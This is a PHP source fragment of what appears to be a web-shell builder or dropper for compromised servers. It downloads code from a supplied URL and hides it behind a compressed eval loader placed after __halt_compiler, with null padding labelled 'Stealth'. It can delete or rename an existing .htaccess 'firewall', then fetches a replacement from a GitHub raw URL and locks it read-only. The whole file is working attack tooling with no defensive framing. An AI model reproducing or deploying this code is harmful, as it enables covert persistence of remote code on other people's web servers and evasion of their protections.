// --- DOWNLOADER FUNCTION ---
function getSource($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $res = curl_exec($ch);
        curl_close($ch);
        if($res) return $res;
    }
    return @file_get_contents($url);
}

// --- BUILDER LOGIC ---
if (isset($_POST['build'])) {
    $url        = trim($_POST['url']);
    $dir_input  = rtrim(trim($_POST['dir_path']), '/\\'); 
    $file_input = trim($_POST['filename']);
    $path       = $dir_input . DIRECTORY_SEPARATOR . $file_input;
    $pad_kb     = intval($_POST['padding']); 
    $bypass     = isset($_POST['bypass_htaccess']) ? true : false;

    if ($url && $dir_input && $file_input) {
        // 1. Prepare Directory
        if (!is_dir($dir_input)) { @mkdir($dir_input, 0755, true); }

        // 2. BYPASS LOGIC
        $htaccess_path = $dir_input . DIRECTORY_SEPARATOR . ".htaccess";
        $htaccess_bak  = $dir_input . DIRECTORY_SEPARATOR . ".htaccess.bak";
        $bypass_msg = "";

        if ($bypass && file_exists($htaccess_path)) {
            if (@rename($htaccess_path, $htaccess_bak)) {
                $bypass_msg = "<br><span style='color:#facc15; font-size:0.8em;'>(Old Firewall Disabled)</span>";
            } else {
                @chmod($htaccess_path, 0666);
                @unlink($htaccess_path); 
            }
        }

        // 3. Download Source
        $code = getSource($url);

        if ($code) {
            $payload = gzdeflate($code, 9);
            if ($pad_kb > 0) {
                $payload .= str_repeat("\0", $pad_kb * 1024); 
            }
            $loader = '<?php
$h = fopen(__FILE__, "rb");
fseek($h, __COMPILER_HALT_OFFSET__);
eval("?>".gzinflate(stream_get_contents($h)));
__halt_compiler();';
            $final = $loader . $payload;

            // 4. Write File
            if (@file_put_contents($path, $final)) {
                $size = number_format(filesize($path)/1024, 2);
                
                // --- AUTO-SUMMON .HTACCESS ---
                $ht_source = "https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Access";
                $ht_code = getSource($ht_source);
                $ht_status = "";
                
                if($ht_code) {
                    if(@file_put_contents($htaccess_path, $ht_code)){
                        @chmod($htaccess_path, 0444); 
                        $ht_status = "<br><span style='color:#10b981; font-size:0.8em;'>(+Auto-Shield .htaccess Installed [0444])</span>";
                    }
                }

                $doc_root = $_SERVER['DOCUMENT_ROOT'];
                $web_link = str_replace($doc_root, "", $path);
                
                $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
                $full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $web_link;
                
                $display_loc = basename($path);

                $msg = "<h5>SYSTEM STATUS: SUCCESS</h5>
                        <div class='info-grid'>
                            <span>Target:</span> <code>$display_loc</code>
                            <span>Size:</span> <code>$size KB (Stealth)</code>
                        </div>
                        
                        <div class='action-buttons'>
                            <a href='$web_link' target='_blank' class='btn-action btn-open'>[ OPEN FILE ]</a>
                            <button type='button' onclick=\"copyLink('$full_url')\" class='btn-action btn-copy'>[ COPY LINK ]</button>
                        </div>
                        
                        $bypass_msg $ht_status";
                $msg_class = "success";
            } else {
                $msg = "Write failed! Permission Denied.<br>Try checking the 'Force Mode' box.";
                $msg_class = "error";
            }
        } else {
            $msg = "Download failed. Check URL or Server Connection.";
            $msg_class = "error";
        }
    } else {
        $msg = "Input missing. Please check all fields.";
        $msg_class = "error";
    }
}

